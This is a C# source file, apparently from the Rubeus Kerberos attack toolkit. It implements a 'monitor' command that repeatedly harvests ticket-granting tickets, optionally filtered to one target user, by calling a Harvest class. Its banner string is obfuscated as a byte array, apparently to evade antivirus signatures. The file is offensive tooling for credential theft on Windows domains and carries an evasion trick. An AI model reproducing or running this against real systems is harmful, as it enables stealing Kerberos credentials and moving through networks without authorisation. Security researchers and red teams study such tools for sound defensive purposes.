using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class Monitor : ICommand
    {
        public static string CommandName => "monitor";

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 84, 71, 84, 32, 77, 111, 110, 105, 116, 111, 114, 105, 110, 103 }));

            string targetUser = null;
            int interval = 60;
            string registryBasePath = null;
            bool nowrap = false;
            int runFor = 0;

            if (arguments.ContainsKey("/nowrap"))
            {
                nowrap = true;
            }
            if (arguments.ContainsKey("/filteruser"))
            {
                targetUser = arguments["/filteruser"];
            }
            if (arguments.ContainsKey("/targetuser"))
            {
                targetUser = arguments["/targetuser"];
            }
            if (arguments.ContainsKey("/monitorinterval"))
            {
                interval = Int32.Parse(arguments["/monitorinterval"]);
            }
            if (arguments.ContainsKey("/interval"))
            {
                interval = Int32.Parse(arguments["/interval"]);
            }
            if (arguments.ContainsKey("/registry"))
            {
                registryBasePath = arguments["/registry"];
            }
            if (arguments.ContainsKey("/runfor"))
            {
                runFor = Int32.Parse(arguments["/runfor"]);
            }

            if (!String.IsNullOrEmpty(targetUser))
            {
                Console.WriteLine("[*] Target user     : {0:x}", targetUser);
            }
            Console.WriteLine("[*] Monitoring every {0} seconds for new TGTs", interval);
            if (runFor > 0)
            {
                Console.WriteLine("[*] Running collection for {0} seconds", runFor);
            }
            Console.WriteLine("");

            var harvester = new Harvest(interval, interval, false, targetUser, registryBasePath, nowrap, runFor);
            harvester.HarvestTicketGrantingTickets();
        }
    }
}